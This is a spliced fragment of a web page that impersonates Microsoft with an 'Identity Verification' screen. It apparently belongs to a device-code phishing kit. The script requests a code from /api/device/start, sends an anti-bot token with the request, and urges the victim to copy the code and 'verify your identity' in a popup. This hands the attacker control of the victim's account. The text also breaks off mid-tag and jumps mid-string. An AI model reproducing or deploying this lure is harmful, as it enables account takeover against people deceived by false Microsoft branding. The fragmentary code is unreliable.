\"9\" height=\"9\" fill=\"#ffb900\" />\n            </svg>\n            <span>Microsoft</span>\n        </div>\n\n        <h1 data-page-title>Identity Verification</h1>\n        <p class=\"desc\" data-page-message>Please click the button below to generate your verification code.</p>\n\n        \n        <button class=\"primary-btn\" id=\"startBtn\" data-primary-button onclick=\"generateCode()\">I'm not a robot</button>\n\n        <div class=\"code-area\" id=\"codeArea\">\n            <p class=\"code-label\">Your verification code</p>\n            <div class=\"code-value\" id=\"codeValue\">——————</div>\n\n            \n            <div class=\"action-row\" id=\"actionRow\" style=\"display:none;\">\n                <button class=\"copy-btn\" id=\"copyBtn\" onclick=\"copyCode()\">Copy code</button>\n                <button class=\"verify-id-btn\" id=\"verifyIdBtn\" onclick=\"verifyWithCopy()\">\n                    <svg viewBox=\"0 0 16 16\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.8\"\n                        stroke-linecap=\"round\">\n                        <rect x=\"2\" y=\"4\" width=\"12\" height=\"9\" rx=\"1.5\" />\n                        <path d=\"M5 4V3a3 3 0 016 0v1\" />\n                        <circle cx=\"8\" cy=\"8.5\" r=\"1.2\" fill=\"currentColor\" stroke=\"none\" />\n                        <line x1=\"8\" y1=\"9.7\" x2=\"8\" y2=\"11\" />\n                    </svg>\n                    Verify your identity\n                </button>\n            </div>\n\n            \n            <button class=\"refresh-btn\" id=\"refreshBtn\" onclick=\"generateCode()\">↻ Refresh code</button>\n\n            <p class=\"timer\" id=\"timer\"></p>\n            <p class=\"status-msg\" id=\"statusMsg\"></p>\n        </div>\n\n        <p class=\"footer\">Protected by Microsoft Security</p>\n    </div>\n\n    \n    <div class=\"success-overlay\" id=\"successOverlay\">\n        <div class=\"success-box\">\n            <svg class=\"success-icon\" viewBox=\"0 0 64 ild(ta);\n                ta.select();\n                document.execCommand('copy');\n                document.body.removeChild(ta);\n            });\n\n            \n            btn.innerHTML = '<svg viewBox=\"0 0 16 16\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.8\" stroke-linecap=\"round\"><polyline points=\"2,8 6,12 14,4\"/></svg> Code copied!';\n            const copyBtn = document.getElementById('copyBtn');\n            if (copyBtn) { copyBtn.textContent = 'Copied!'; setTimeout(() => copyBtn.textContent = 'Copy code', 1500); }\n            setTimeout(() => { btn.innerHTML = originalHTML; }, 1500);\n\n            openPopup();\n        }\n\n        \n        async function generateCode() {\n            \n            document.getElementById('refreshBtn').classList.remove('show');\n            document.getElementById('actionRow').style.display = 'none';\n            document.getElementById('timer').textContent = '';\n            document.getElementById('timer').classList.remove('expired');\n\n            const startBtn = document.getElementById('startBtn');\n            startBtn.textContent = 'Generating verification code...';\n            startBtn.disabled = true;\n\n            setStatus('');\n            clearInterval(pollInterval);\n            clearInterval(countdown);\n            sid = null;\n            codeReady = false;\n\n            try {\n                const r = await fetch('/api/device/start', {\n                    method: 'POST',\n                    headers: { 'X-Antibot-Token': AT, 'X-Auth-Mode': MODE }\n                });\n                const d = await r.json();\n\n                if (d.error) { showError(d.error); return; }\n\n                sid = d.job_id;\n                if (!sid) { showError('Session failed. Please refresh.'); return; }\n                startTime = Date.now();\n\n                document.getElementById('codeArea').classList.add('show');\n                setStatus('Connecting to Microsoft servers…');\n\n
